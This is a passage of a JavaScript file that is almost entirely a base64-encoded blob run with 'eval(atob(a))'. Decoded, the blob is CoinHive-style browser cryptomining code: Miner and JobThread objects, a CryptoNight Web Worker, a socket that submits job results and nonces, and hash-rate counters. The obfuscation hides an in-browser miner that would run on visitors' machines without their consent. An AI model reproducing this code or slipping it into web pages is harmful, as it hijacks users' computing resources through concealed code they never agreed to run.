CAgam9iX2lkOiByZXN1bHQuam9iX2lkLAogICAgICAgIG5vbmNlOiByZXN1bHQubm9uY2UsCiAgICAgICAgcmVzdWx0OiByZXN1bHQucmVzdWx0CiAgICAgIH0pOwogICAgfQogIH07CiAgTWluZXIucHJvdG90eXBlLl9vblZlcmlmaWVkID0gZnVuY3Rpb24odmVyaWZ5UmVzdWx0KSB7CiAgICB0aGlzLl9zZW5kKCJ2ZXJpZmllZCIsIHZlcmlmeVJlc3VsdCk7CiAgfTsKICBNaW5lci5wcm90b3R5cGUuX3NlbmQgPSBmdW5jdGlvbih0eXBlLCBwYXJhbXMpIHsKICAgIGlmICghdGhpcy5fc29ja2V0KSB7CiAgICAgIHJldHVybjsKICAgIH0KICAgIHZhciBtc2cgPSB7IHR5cGU6IHR5cGUsIHBhcmFtczogcGFyYW1zIHx8IHt9IH07CiAgICB0aGlzLl9zb2NrZXQuc2VuZChKU09OLnN0cmluZ2lmeShtc2cpKTsKICB9OwogIHdpbmRvdy5DSCA9IHdpbmRvdy5DSCB8fCB7fTsKICB3aW5kb3cuQ0guSUZfRVhDTFVTSVZFX1RBQiA9ICJpZkV4Y2x1c2l2ZVRhYiI7CiAgd2luZG93LkNILkZPUkNFX0VYQ0xVU0lWRV9UQUIgPSAiZm9yY2VFeGNsdXNpdmVUYWIiOwogIHdpbmRvdy5DSC5GT1JDRV9NVUxUSV9UQUIgPSAiZm9yY2VNdWx0aVRhYiI7CiAgd2luZG93LkNILlRva2VuID0gZnVuY3Rpb24oc2l0ZUtleSwgZ29hbCwgcGFyYW1zKSB7CiAgICB2YXIgbWluZXIgPSBuZXcgTWluZXIoc2l0ZUtleSwgcGFyYW1zKTsKICAgIG1pbmVyLl9nb2FsID0gZ29hbCB8fCAwOwogICAgcmV0dXJuIG1pbmVyOwogIH07CiAgd2luZG93LkNILlVzZXIgPSBmdW5jdGlvbihzaXRlS2V5LCB1c2VyLCBwYXJhbXMpIHsKICAgIHZhciBtaW5lciA9IG5ldyBNaW5lcihzaXRlS2V5LCBwYXJhbXMpOwogICAgbWluZXIuX3VzZXIgPSB1c2VyOwogICAgcmV0dXJuIG1pbmVyOwogIH07CiAgd2luZG93LkNILkFub255bW91cyA9IGZ1bmN0aW9uKHNpdGVLZXksIHBhcmFtcykgewogICAgdmFyIG1pbmVyID0gbmV3IE1pbmVyKHNpdGVLZXksIHBhcmFtcyk7CiAgICByZXR1cm4gbWluZXI7CiAgfTsKfQoKZnVuY3Rpb24gc2V0dXBKb2IoKSB7CiAgInVzZSBzdHJpY3QiOwogIHZhciBKb2JUaHJlYWQgPSBmdW5jdGlvbigpIHsKICAgIHRoaXMud29ya2VyID0gbmV3IFdvcmtlcihDSC5DUllQVE9OSUdIVF9XT1JLRVJfQkxPQik7CiAgICB0aGlzLndvcmtlci5vbm1lc3NhZ2UgPSB0aGlzLm9uUmVhZHkuYmluZCh0aGlzKTsKICAgIHRoaXMuY3VycmVudEpvYiA9IG51bGw7CiAgICB0aGlzLmpvYkNhbGxiYWNrID0gZnVuY3Rpb24oKSB7fTsKICAgIHRoaXMudmVyaWZ5Q2FsbGJhY2sgPSBmdW5jdGlvbigpIHt9OwogICAgdGhpcy5faXNSZWFkeSA9IGZhbHNlOwogICAgdGhpcy5oYXNoZXNQZXJTZWNvbmQgPSAwOwogICAgdGhpcy5oYXNoZXNUb3RhbCA9IDA7CiAgICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsKICAgIHRoaXMubGFzdE1lc3NhZ2VUaW1lc3RhbXAgPSBEYXRlLm5vdygpOwogIH07CiAgSm9iVGhyZWFkLnByb3RvdHlwZS5vblJlYWR5ID0gZnVuY3Rpb24obXNnKSB7CiAgICBpZiAobXNnLmRhdGEgIT09ICJyZWFkeSIgfHwgdGhpcy5faXNSZWFkeSkgewogICAgICB0aHJvdyAnRXhwZWN0aW5nIGZpcnN0IG1lc3NhZ2UgdG8gYmUgInJlYWR5IiwgZ290ICcgKyBtc2c7CiAgICB9CiAgICB0aGlzLl9pc1JlYWR5ID0gdHJ1ZTsKICAgIHRoaXMud29ya2VyLm9ubWVzc2FnZSA9IHRoaXMub25SZWNlaXZlTXNnLmJpbmQodGhpcyk7CiAgICBpZiAodGhpcy5jdXJyZW50Sm9iKSB7CiAgICAgIHRoaXMucnVubmluZyA9IHRydWU7CiAgICAgIHRoaXMud29ya2VyLnBvc3RNZXNzYWdlKHRoaXMuY3VycmVudEpvYik7CiAgICB9CiAgfTsKICBKb2JUaHJlYWQucHJvdG90eXBlLm9uUmVjZWl2ZU1zZyA9IGZ1bmN0aW9uKG1zZykgewogICAgaWYgKG1zZy5kYXRhLnZlcmlmeV9pZCkgewogICAgICB0aGlzLnZlcmlmeUNhbGxiYWNrKG1zZy5kYXRhKTsKICAgICAgcmV0dXJuOwogICAgfQogICAgaWYgKG1zZy5kYXRhLnJlc3VsdCkgewogICAgICB0aGlzLmpvYkNhbGxiYWNrKG1zZy5kYXRhKTsKICAgIH0KICAgIHRoaXMuaGFzaGVzUGVyU2Vjb25kID0KICAgICAgdGhpcy5oYXNoZXNQZXJTZWNvbmQgKiAwLjUgKyBtc2cuZGF0YS5oYXNoZXNQZXJTZWNvbmQgKiAwLjU7CiAgICB0aGlzLmhhc2hlc1RvdGFsICs9IG1zZy5kYXRhLmhhc2hlczsKICAgIHRoaXMubGFzdE1lc3NhZ2VUaW1lc3RhbXAgPSBEYXRlLm5vdygpOwogICAgaWYgKHRoaXMucnVubmluZykgewogICAgICB0aGlzLndvcmtlci5wb3N0TWVzc2FnZSh0aGlzLmN1cnJlbnRKb2IpOwogICAgfQogIH07CiAgSm9iVGhyZWFkLnByb3RvdHlwZS5zZXRKb2IgPSBmdW5jdGlvbihqb2IsIGNhbGxiYWNrKSB7CiAgICB0aGlzLmN1cnJlbnRKb2IgPSBqb2I7CiAgICB0aGlzLmpvYkNhbGxiYWNrID0gY2FsbGJhY2s7CiAgICBpZiAodGhpcy5faXNSZWFkeSAmJiAhdGhpcy5ydW5uaW5nKSB7CiAgICAgIHRoaXMucnVubmluZyA9IHRydWU7CiAgICAgIHRoaXMud29ya2VyLnBvc3RNZXNzYWdlKHRoaXMuY3VycmVudEpvYik7CiAgICB9CiAgfTsKICBKb2JUaHJlYWQucHJvdG90eXBlLnZlcmlmeSA9IGZ1bmN0aW9uKGpvYiwgY2FsbGJhY2spIHsKICAgIGlmICghdGhpcy5faXNSZWFkeSkgewogICAgICByZXR1cm47CiAgICB9CiAgICB0aGlzLnZlcmlmeUNhbGxiYWNrID0gY2FsbGJhY2s7CiAgICB0aGlzLndvcmtlci5wb3N0TWVzc2FnZShqb2IpOwogIH07CiAgSm9iVGhyZWFkLnByb3RvdHlwZS5zdG9wID0gZnVuY3Rpb24oKSB7CiAgICBpZiAodGhpcy53b3JrZXIpIHsKICAgICAgdGhpcy53b3JrZXIudGVybWluYXRlKCk7CiAgICAgIHRoaXMud29ya2VyID0gbnVsbDsKICAgIH0KICAgIHRoaXMucnVubmluZyA9IGZhbHNlOwogIH07CiAgd2luZG93LkNILkpvYlRocmVhZCA9IEpvYlRocmVhZDsKfQoKCg';
eval(atob(a));
